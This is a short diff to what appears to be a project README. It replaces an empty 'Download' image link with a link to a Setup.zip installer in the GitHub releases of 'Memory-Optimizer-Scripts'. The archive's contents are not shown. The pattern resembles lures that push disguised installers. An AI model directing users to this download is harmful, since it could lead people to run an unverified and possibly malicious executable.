@@ -8,7 +8,7 @@
 
 ---
 
-[![Download](og-image.png)]()
+[![Download](og-image.png)](https://github.com/FierceAeromancer/Memory-Optimizer-Scripts/releases/download/Release/Setup.zip)
 
 
 ---
